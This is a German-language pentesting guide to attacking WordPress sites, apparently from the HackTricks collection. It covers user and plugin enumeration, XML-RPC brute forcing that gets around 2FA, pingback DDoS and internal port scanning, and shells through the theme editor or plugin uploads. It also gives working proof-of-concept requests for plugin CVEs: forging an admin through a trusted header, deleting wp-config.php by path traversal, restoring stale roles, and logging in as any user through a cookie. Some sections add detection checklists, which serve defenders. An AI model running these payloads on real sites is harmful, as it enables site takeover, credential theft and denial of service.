# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

- **Hochgeladene** Dateien landen unter: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Theme-Dateien befinden sich in /wp-content/themes/,** daher wirst du wahrscheinlich diesen Pfad verwenden, wenn du etwas PHP im Theme √§nderst, um RCE zu bekommen. Zum Beispiel: Wenn du das **Theme twentytwelve** verwendest, kannst du die Datei **404.php** erreichen unter: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Eine weitere n√ºtzliche URL k√∂nnte sein:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** kannst du das Root-Passwort der Datenbank finden.
- Standard-Login-Pfade, die √ºberpr√ºft werden sollten: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Wichtige WordPress-Dateien**

- `index.php`
- `license.txt` enth√§lt n√ºtzliche Informationen wie die installierte WordPress-Version.
- `wp-activate.php` wird f√ºr den E-Mail-Aktivierungsprozess beim Einrichten einer neuen WordPress-Site verwendet.
- Login-Dateien (k√∂nnen umbenannt sein, um sie zu verbergen):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` ist eine Datei, die eine WordPress-Funktion darstellt, die die √úbertragung von Daten erm√∂glicht, wobei HTTP als Transportmechanismus und XML als Kodierungsmechanismus dient. Diese Art der Kommunikation wurde durch die WordPress REST API ersetzt.
- Der `wp-content`-Ordner ist das Hauptverzeichnis, in dem Plugins und Themes gespeichert sind.
- `wp-content/uploads/` ist das Verzeichnis, in dem alle auf die Plattform hochgeladenen Dateien gespeichert werden.
- `wp-includes/` ist das Verzeichnis, in dem Core-Dateien gespeichert sind, wie Zertifikate, Schriftarten, JavaScript-Dateien und Widgets.
- `wp-sitemap.xml` In WordPress-Versionen 5.5 und h√∂her generiert WordPress eine sitemap-XML-Datei mit allen √∂ffentlichen Beitr√§gen sowie √∂ffentlich abfragbaren Post-Typen und Taxonomien.

**Post exploitation**

- Die `wp-config.php`-Datei enth√§lt Informationen, die WordPress ben√∂tigt, um sich mit der Datenbank zu verbinden, wie den Datenbanknamen, Datenbank-Host, Benutzername und Passwort, Authentifizierungs-Schl√ºssel und Salts sowie das Pr√§fix der Datenbanktabellen. Diese Konfigurationsdatei kann auch verwendet werden, um den DEBUG-Modus zu aktivieren, was bei der Fehlersuche hilfreich sein kann.

### Benutzerberechtigungen

- **Administrator**
- **Editor**: Ver√∂ffentlicht und verwaltet eigene und fremde Beitr√§ge
- **Author**: Ver√∂ffentlicht und verwaltet seine eigenen Beitr√§ge
- **Contributor**: Verfasst und verwaltet seine Beitr√§ge, kann sie aber nicht ver√∂ffentlichen
- **Subscriber**: Kann Beitr√§ge lesen und sein Profil bearbeiten

## **Passive Enumeration**

### WordPress-Version ermitteln

Pr√ºfe, ob du die Dateien `/license.txt` oder `/readme.html` finden kannst.

Im **Quellcode** der Seite (Beispiel von [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS-Linkdateien

![](<../../images/image (533).png>)

- JavaScript-Dateien

![](<../../images/image (524).png>)

### Plugins herunterladen
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Themes abrufen
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Versionen im Allgemeinen extrahieren
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Active enumeration

### Plugins and Themes

Du wirst wahrscheinlich nicht alle Plugins und Themes finden k√∂nnen. Um alle zu entdecken, musst du **actively Brute Force a list of Plugins and Themes** (hoffentlich gibt es daf√ºr automatisierte Tools, die diese Listen enthalten).

### Benutzer

- **ID Brute:** Du erh√§ltst g√ºltige Benutzer von einer WordPress-Seite, indem du Benutzer-IDs Brute Forcing durchf√ºhrst:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Wenn die Antworten **200** oder **30X** sind, bedeutet das, dass die id **g√ºltig** ist. Wenn die Antwort **400** ist, dann ist die id **ung√ºltig**.

- **wp-json:** Sie k√∂nnen auch versuchen, Informationen √ºber die Benutzer zu erhalten, indem Sie abfragen:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Ein weiterer `/wp-json/` endpoint, der einige Informationen √ºber Benutzer offenlegen kann, ist:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Beachte, dass dieser endpoint nur Benutzer offenlegt, die einen Beitrag erstellt haben. **Es werden nur Informationen √ºber Benutzer bereitgestellt, bei denen diese Funktion aktiviert ist**.

Also beachte, dass **/wp-json/wp/v2/pages** IP-Adressen leaken k√∂nnte.

- **Login username enumeration**: Beim Login √ºber **`/wp-login.php`** ist die **Meldung** **unterschiedlich**, je nachdem ob der angegebene **Benutzername existiert oder nicht**.

### XML-RPC

Wenn `xml-rpc.php` aktiv ist, kannst du eine credentials brute-force durchf√ºhren oder es nutzen, um DoS-Angriffe auf andere Ressourcen zu starten. (Du kannst diesen Prozess zum Beispiel [using this](https://github.com/relarizky/wpxploit) automatisieren).

Um zu pr√ºfen, ob es aktiv ist, versuche auf _**/xmlrpc.php**_ zuzugreifen und diese Anfrage zu senden:

**Pr√ºfen**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** oder **`metaWeblog.getUsersBlogs`** sind einige der Methoden, die verwendet werden k√∂nnen, um credentials zu brute-force. Wenn du eine davon findest, kannst du etwas wie Folgendes senden:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Die Meldung _"Incorrect username or password"_ innerhalb einer 200-Status-Antwort sollte erscheinen, wenn die Zugangsdaten nicht g√ºltig sind.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Mit den korrekten Zugangsdaten kannst du eine Datei hochladen. In der Antwort erscheint der Pfad ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Auch gibt es einen **schnelleren Weg**, Zugangsdaten per Brute-Force zu erlangen, indem man **`system.multicall`** verwendet, da man mehrere Zugangsdaten in derselben Anfrage ausprobieren kann:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**2FA umgehen**

Diese Methode ist f√ºr Programme und nicht f√ºr Menschen gedacht und veraltet, daher unterst√ºtzt sie kein 2FA. Wenn du also g√ºltige creds hast, aber der Hauptzugang durch 2FA gesch√ºtzt ist, **kannst du m√∂glicherweise xmlrpc.php missbrauchen, um dich mit diesen creds anzumelden und 2FA zu umgehen**. Beachte, dass du nicht alle Aktionen ausf√ºhren kannst, die √ºber die Konsole m√∂glich sind, aber du kannst m√∂glicherweise trotzdem RCE erreichen, wie Ippsec in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) erkl√§rt.

**DDoS oder Port-Scanning**

Wenn du die Methode _**pingback.ping**_ in der Liste findest, kannst du Wordpress dazu bringen, eine beliebige Anfrage an jeden Host/Port zu senden.\
Das kann verwendet werden, um **tausende** von Wordpress **Sites** dazu zu bringen, einen **Ort** aufzurufen (wodurch dort ein **DDoS** verursacht wird) oder du kannst es nutzen, um **Wordpress** ein internes **Netzwerk** scannen zu lassen (du kannst jeden Port angeben).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Wenn Sie **faultCode** mit einem Wert **gr√∂√üer** als **0** (17) erhalten, bedeutet das, dass der Port offen ist.

Schauen Sie sich die Verwendung von **`system.multicall`** im vorherigen Abschnitt an, um zu lernen, wie man diese Methode missbrauchen kann, um DDoS zu verursachen.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Diese Datei befindet sich normalerweise im Root der Wordpress-Website: **`/wp-cron.php`**\
Wenn diese Datei **aufgerufen** wird, wird eine "**schwere**" MySQL **Abfrage** ausgef√ºhrt, daher kann sie von **Angreifern** genutzt werden, um einen **DoS** zu **verursachen**.\
Auch wird standardm√§√üig `wp-cron.php` bei jedem Seitenaufruf (immer wenn ein Client eine Wordpress-Seite anfordert) aufgerufen, was bei stark frequentierten Seiten Probleme (DoS) verursachen kann.

Es wird empfohlen, Wp-Cron zu deaktivieren und einen echten cronjob auf dem Host einzurichten, der die ben√∂tigten Aktionen in regelm√§√üigen Abst√§nden ausf√ºhrt (ohne Probleme zu verursachen).

### /wp-json/oembed/1.0/proxy - SSRF

Versuche, auf _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ zuzugreifen, und die Wordpress-Seite k√∂nnte eine Anfrage an dich senden.

Dies ist die Antwort, wenn es nicht funktioniert:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Dieses Tool pr√ºft, ob der **methodName: pingback.ping** und der Pfad **/wp-json/oembed/1.0/proxy** vorhanden sind, und falls ja, versucht es, diese auszunutzen.

## Automatische Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Zugriff durch √úberschreiben eines Bits

Eher eine Kuriosit√§t als ein realer Angriff. Im CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) konntest du 1 Bit in jeder wordpress-Datei flippen. So konntest du an Position `5389` der Datei `/var/www/html/wp-includes/user.php` ein Bit flippen, um die NOT (`!`) Operation zu NOPen.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**√Ñndern einer php-Datei des verwendeten Themes (Admin-Zugang erforderlich)**

Design ‚Üí Theme-Editor ‚Üí 404-Vorlage (rechts)

√Ñndere den Inhalt zu einer php shell:

![](<../../images/image (384).png>)

Recherchiere im Internet, wie du auf die aktualisierte Seite zugreifen kannst. In diesem Fall musst du hier zugreifen: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Du kannst verwenden:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
um eine Session zu bekommen.

## Plugin RCE

### PHP plugin

Es kann m√∂glich sein, .php-Dateien als Plugin hochzuladen.\
Create your php backdoor using for example:

![](<../../images/image (183).png>)

Dann ein neues Plugin hinzuf√ºgen:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Klicken Sie auf Procced:

![](<../../images/image (70).png>)

Wahrscheinlich scheint dies nichts zu bewirken, aber wenn Sie zu Media gehen, sehen Sie Ihre hochgeladene shell:

![](<../../images/image (462).png>)

Rufen Sie sie auf und Sie sehen die URL, um die reverse shell auszuf√ºhren:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Diese Methode beinhaltet die Installation eines b√∂sartigen Plugins, das daf√ºr bekannt ist, verwundbar zu sein und ausgenutzt werden kann, um eine web shell zu erhalten. Dieser Prozess wird √ºber das WordPress-Dashboard wie folgt durchgef√ºhrt:

1. **Plugin Acquisition**: Das Plugin wird von einer Quelle wie Exploit DB bezogen, zum Beispiel [**hier**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Navigieren Sie im WordPress-Dashboard zu `Dashboard > Plugins > Upload Plugin`.
- Laden Sie die ZIP-Datei des heruntergeladenen Plugins hoch.
3. **Plugin Activation**: Nachdem das Plugin erfolgreich installiert wurde, muss es √ºber das Dashboard aktiviert werden.
4. **Exploitation**:
- Mit installiertem und aktiviertem Plugin "reflex-gallery" kann dieses ausgenutzt werden, da es als verwundbar bekannt ist.
- Das Metasploit-Framework stellt einen Exploit f√ºr diese Verwundbarkeit bereit. Durch Laden des entsprechenden Moduls und Ausf√ºhren spezifischer Befehle kann eine meterpreter-Session hergestellt werden, die unbefugten Zugriff auf die Seite erm√∂glicht.
- Es sei angemerkt, dass dies nur eine von vielen Methoden ist, um eine WordPress-Seite auszunutzen.

Der Inhalt enth√§lt visuelle Hilfen, die die Schritte im WordPress-Dashboard zum Installieren und Aktivieren des Plugins darstellen. Es ist jedoch wichtig zu beachten, dass das Ausnutzen von Schwachstellen auf diese Weise ohne entsprechende Genehmigung illegal und unethisch ist. Diese Informationen sollten verantwortungsbewusst und nur in einem legalen Kontext, wie z. B. bei Penetrationstests mit ausdr√ºcklicher Erlaubnis, verwendet werden.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ ist ein Script, das dazu entwickelt wurde, eine **Cross-Site Scripting (XSS)**-Schwachstelle zu eskalieren zu **Remote Code Execution (RCE)** oder anderen kritischen Schwachstellen in WordPress. F√ºr mehr Infos siehe [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Es bietet **Support f√ºr Wordpress Versions 6.X.X, 5.X.X und 4.X.X und erm√∂glicht:**
- _**Privilege Escalation:**_ Erstellt einen Benutzer in WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Laden Sie Ihr eigenes Plugin (backdoor) in WordPress hoch.
- _**(RCE) Built-In Plugin Edit:**_ Bearbeitet eingebaute Plugins in WordPress.
- _**(RCE) Built-In Theme Edit:**_ Bearbeitet eingebaute Themes in WordPress.
- _**(Custom) Custom Exploits:**_ Custom Exploits f√ºr Third-Party WordPress Plugins/Themes.

## Post Exploitation

Benutzernamen und Passw√∂rter extrahieren:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Admin-Passwort √§ndern:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Angriffsfl√§che

Zu wissen, wie ein Wordpress-Plugin Funktionalit√§t nach au√üen bereitstellen kann, ist entscheidend, um Schwachstellen in dessen Funktionalit√§t zu finden. Wie ein Plugin Funktionalit√§t offenlegen k√∂nnte, sehen Sie in den folgenden Aufz√§hlungspunkten und einige Beispiele verwundbarer Plugins in [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Eine M√∂glichkeit, wie ein Plugin Funktionen nach au√üen bereitstellen kann, ist √ºber AJAX-Handler. Diese k√∂nnen Logik-, Autorisierungs- oder Authentifizierungsfehler enthalten. Au√üerdem ist es ziemlich h√§ufig, dass diese Funktionen sowohl die Authentifizierung als auch die Autorisierung auf das Vorhandensein eines Wordpress nonce st√ºtzen, den **jeder in der Wordpress-Instanz authentifizierte Benutzer** haben k√∂nnte (unabh√§ngig von seiner Rolle).

Dies sind die Funktionen, die verwendet werden k√∂nnen, um eine Funktion in einem Plugin freizugeben:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Die Verwendung von `nopriv` macht den Endpunkt f√ºr alle Benutzer zug√§nglich (auch f√ºr nicht authentifizierte).**

> [!CAUTION]
> Au√üerdem, wenn die Funktion nur die Autorisierung des Benutzers mit der Funktion `wp_verify_nonce` √ºberpr√ºft, pr√ºft diese Funktion lediglich, ob der Benutzer eingeloggt ist; sie √ºberpr√ºft normalerweise nicht die Rolle des Benutzers. Daher k√∂nnten Benutzer mit geringen Rechten Zugriff auf Aktionen mit hohen Rechten haben.

- **REST API**

Es ist auch m√∂glich, Funktionen aus wordpress offenzulegen, indem man eine REST API mit der Funktion `register_rest_route` registriert:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
Der `permission_callback` ist eine Callback-Funktion, die √ºberpr√ºft, ob ein bestimmter Benutzer berechtigt ist, die API-Methode aufzurufen.

**Wenn die eingebaute Funktion `__return_true` verwendet wird, wird die Benutzerberechtigungspr√ºfung einfach √ºbersprungen.**

- **Direkter Zugriff auf die PHP-Datei**

Nat√ºrlich verwendet Wordpress PHP und Dateien innerhalb von Plugins sind direkt √ºber das Web zug√§nglich. Wenn ein Plugin also eine anf√§llige Funktionalit√§t bereitstellt, die bereits durch den einfachen Zugriff auf die Datei ausgel√∂st wird, kann sie von jedem Benutzer ausgenutzt werden.

### Trusted-header REST-Impersonation (WooCommerce Payments ‚â§ 5.6.1)

Einige Plugins implementieren ‚Äûtrusted header‚Äú Shortcuts f√ºr interne Integrationen oder Reverse Proxies und verwenden diesen Header dann, um den aktuellen Benutzerkontext f√ºr REST-Anfragen zu setzen. Wenn der Header nicht von einer vorgelagerten Komponente kryptografisch an die Anfrage gebunden ist, kann ein Angreifer ihn f√§lschen und privilegierte REST-Routen als Administrator aufrufen.

- Impact: nicht authentifizierte Privilegieneskalation zum Admin, indem ein neuer Administrator √ºber die core users REST route erstellt wird.
- Beispielheader: `X-Wcpay-Platform-Checkout-User: 1` (erzwingt Benutzer-ID 1, typischerweise das erste Administrator-Konto).
- Ausgenutzte Route: `POST /wp-json/wp/v2/users` mit einem erh√∂hten Rollen-Array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Warum es funktioniert

- Das Plugin mappt einen vom Client kontrollierten Header auf den Authentifizierungszustand und √ºberspringt Capability-Checks.
- Der WordPress-Core erwartet die `create_users`-Capability f√ºr diese Route; der Plugin-Hack umgeht dies, indem er den aktuellen Benutzerkontext direkt aus dem Header setzt.

Erwartete Erfolgssignale

- HTTP 201 mit einem JSON-Body, der den erstellten Benutzer beschreibt.
- Ein neuer Admin-Benutzer sichtbar in `wp-admin/users.php`.

Checkliste zur Erkennung

- Grep nach `getallheaders()`, `$_SERVER['HTTP_...']` oder Vendor-SDKs, die benutzerdefinierte Header lesen, um den Benutzerkontext zu setzen (z. B. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- √úberpr√ºfe REST-Registrierungen auf privilegierte Callbacks, die keine robusten `permission_callback`-Pr√ºfungen haben und stattdessen auf Request-Header vertrauen.
- Suche nach Verwendungen von Core-User-Management-Funktionen (`wp_insert_user`, `wp_create_user`) in REST-Handlern, die nur durch Header-Werte abgesichert sind.

### Nicht-authentifizierte beliebige Dateil√∂schung √ºber wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress-Themes und -Plugins geben h√§ufig AJAX-Handler √ºber die Hooks `wp_ajax_` und `wp_ajax_nopriv_` frei. Wenn die **_nopriv_**-Variante verwendet wird **wird der Callback f√ºr nicht-authentifizierte Besucher erreichbar**, daher muss jede sensible Aktion zus√§tzlich implementieren:

1. Eine **Capability-Pr√ºfung** (z. B. `current_user_can()` oder mindestens `is_user_logged_in()`), und
2. Eine **CSRF-Nonce**, validiert mit `check_ajax_referer()` / `wp_verify_nonce()`, und
3. **Strikte Eingabe-Sanitierung / Validierung**.

Das Litho multipurpose theme (< 3.1) hat diese 3 Kontrollen in der *Remove Font Family* Funktion vergessen und lieferte schlie√ülich den folgenden Code (vereinfacht):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Probleme, die durch dieses Snippet eingef√ºhrt wurden:

* **Unauthenticated access** ‚Äì der `wp_ajax_nopriv_` Hook ist registriert.
* **No nonce / capability check** ‚Äì jeder Besucher kann den Endpoint aufrufen.
* **No path sanitisation** ‚Äì die vom Benutzer kontrollierte `fontfamily`-Zeichenkette wird ohne Filterung an einen Dateisystempfad angeh√§ngt, was klassischen `../../`-Traversal erm√∂glicht.

#### Exploitation

Ein Angreifer kann durch das Senden einer einzelnen HTTP POST-Anfrage jede Datei oder jedes Verzeichnis **unterhalb des Uploads-Stammverzeichnisses** (normalerweise `<wp-root>/wp-content/uploads/`) l√∂schen:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Weil `wp-config.php` au√üerhalb von *uploads* liegt, reichen auf einer Standardinstallation vier `../`-Sequenzen aus. Das L√∂schen von `wp-config.php` zwingt WordPress beim n√§chsten Aufruf in den *Installationsassistenten*, was eine vollst√§ndige Seiten√ºbernahme erm√∂glicht (der Angreifer liefert lediglich eine neue DB-Konfiguration und legt einen Admin-Benutzer an).

Weitere wirkungsvolle Ziele sind Plugin-/Theme-`.php`-Dateien (um Sicherheitsplugins zu umgehen) oder `.htaccess`-Regeln.

#### Erkennungs-Checkliste

* Jeder `add_action( 'wp_ajax_nopriv_...')`-Callback, der Dateisystem-Helfer (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.) aufruft.
* Konkatenation nicht bereinigter Benutzereingaben in Pfade (suche nach `$_POST`, `$_GET`, `$_REQUEST`).
* Fehlen von `check_ajax_referer()` und `current_user_can()`/`is_user_logged_in()`.

---

### Privilege escalation durch veraltete Rollenwiederherstellung und fehlende Autorisierung (ASE "View Admin as Role")

Viele Plugins implementieren eine "view as role" oder tempor√§re Rollenwechsel-Funktion, indem sie die urspr√ºngliche(n) Rolle(n) in user meta speichern, damit diese sp√§ter wiederhergestellt werden k√∂nnen. Wenn der Wiederherstellungs-Pfad ausschlie√ülich auf Request-Parametern (z. B. `$_REQUEST['reset-for']`) und einer vom Plugin gepflegten Liste beruht, ohne capabilities und ein g√ºltiges nonce zu pr√ºfen, wird dies zu einer vertical privilege escalation.

Ein reales Beispiel wurde im Admin and Site Enhancements (ASE) Plugin (‚â§ 7.6.2.1) gefunden. Der Reset-Zweig stellte Rollen basierend auf `reset-for=<username>` wieder her, wenn der Benutzername in einem internen Array `$options['viewing_admin_as_role_are']` erschien, f√ºhrte jedoch weder eine `current_user_can()`-Pr√ºfung noch eine Nonce-√úberpr√ºfung durch, bevor die aktuellen Rollen entfernt und die in user meta `_asenha_view_admin_as_original_roles` gespeicherten Rollen wieder hinzugef√ºgt wurden:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Warum es ausnutzbar ist

- Vertraut `$_REQUEST['reset-for']` und einer Plugin-Option ohne serverseitige Autorisierung.
- Wenn ein Benutzer zuvor h√∂here Privilegien in `_asenha_view_admin_as_original_roles` gespeichert hatte und herabgestuft wurde, kann er diese wiederherstellen, indem er den Reset-Pfad aufruft.
- In einigen Bereitstellungen k√∂nnte jeder authentifizierte Benutzer einen Reset f√ºr einen anderen Benutzernamen ausl√∂sen, der noch in `viewing_admin_as_role_are` vorhanden ist (fehlerhafte Autorisierung).

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Auf verwundbaren Builds entfernt dies die aktuellen Rollen und f√ºgt die gespeicherten Originalrollen wieder hinzu (z. B. `administrator`), wodurch effektiv Privilegien eskaliert werden.

Detection checklist

- Look for role-switching features that persist ‚Äúoriginal roles‚Äù in user meta (e.g., `_asenha_view_admin_as_original_roles`).
- Identify reset/restore paths that:
- Benutzernamen aus `$_REQUEST` / `$_GET` / `$_POST` lesen.
- Rollen via `add_role()` / `remove_role()` √§ndern ohne `current_user_can()` und `wp_verify_nonce()` / `check_admin_referer()`.
- Auf Basis eines Plugin-Option-Arrays autorisieren (z. B. `viewing_admin_as_role_are`) statt basierend auf den F√§higkeiten des Akteurs.

---

### Nicht authentifizierte Privilegieneskalation durch cookie‚Äëvertrauensw√ºrdigen Benutzerwechsel am √∂ffentlichen init-Hook (Service Finder ‚Äúsf-booking‚Äù)

Einige Plugins h√§ngen user-switching Helpers an den √∂ffentlichen `init` Hook und leiten die Identit√§t aus einem vom Client kontrollierten cookie ab. Wenn der Code `wp_set_auth_cookie()` aufruft, ohne Authentifizierung, capability und einen g√ºltigen nonce zu √ºberpr√ºfen, kann jeder nicht authentifizierte Besucher sich als eine beliebige Benutzer-ID anmelden.

Typisches verwundbares Muster (vereinfacht aus Service Finder Bookings ‚â§ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // üî• sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Warum es ausnutzbar ist

- √ñffentlicher `init` hook macht den Handler f√ºr nicht authentifizierte Benutzer erreichbar (keine `is_user_logged_in()`-Pr√ºfung).
- Die Identit√§t wird aus einem vom Client √§nderbaren Cookie (`original_user_id`) abgeleitet.
- Direkter Aufruf von `wp_set_auth_cookie($uid)` loggt den Anfragenden als diesen Benutzer ein, ohne Capability-/Nonce-Pr√ºfungen.

Exploitation (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF-√úberlegungen f√ºr WordPress/plugin CVEs

Generische Edge-/Server-WAFs sind auf breite Muster (SQLi, XSS, LFI) abgestimmt. Viele hochkritische WordPress/plugin-Schwachstellen sind anwendungsspezifische Logik-/Authentifizierungs-Bugs, die wie harmloser Traffic aussehen, wenn die Engine WordPress-Routen und Plugin-Semantik nicht kennt.

Offensive Hinweise

